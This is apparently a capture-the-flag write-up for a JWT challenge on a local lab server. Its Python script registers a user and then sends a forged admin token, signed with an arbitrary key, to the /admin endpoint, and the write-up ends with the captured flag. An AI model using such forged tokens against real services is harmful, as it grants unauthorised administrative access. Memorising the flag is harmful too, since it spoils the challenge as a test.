---
ai_date: 2025-04-27 05:26:18
ai_summary: JWT signing bypass due to lack of validation
ai_tags:
  - jwt
  - bypass
  - auth
created: 2025-03-01T20:43
points: 100
solves: 20
updated: 2025-07-14T09:46
---

I thought this was a JWT cracking challenge, but turns out I can just sign it with whatever and it will work. The pasted JWT is from jwt.io with `"role": "admin"`.

```python
import requests
s = requests.Session()
s.post("http://127.0.0.1:53080/signup", json={"username": "www", "password": "www"})
res = s.post("http://127.0.0.1:53080/login", json={"username": "www", "password": "www"}).json()
print(s.get("http://127.0.0.1:53080/admin", headers={"Authorization": "Bearer " +
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ind3dyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0MDg3OTY1MiwiZXhwIjoxNzQwODgzMjUyfQ.OQyUrtYW33oG9pUdSRh1_Feps9OI1_ZnJ6qVtmbzgu8"}).text)
```

```flag
ATHACKCTF{trust_is_a_vulnerability}
```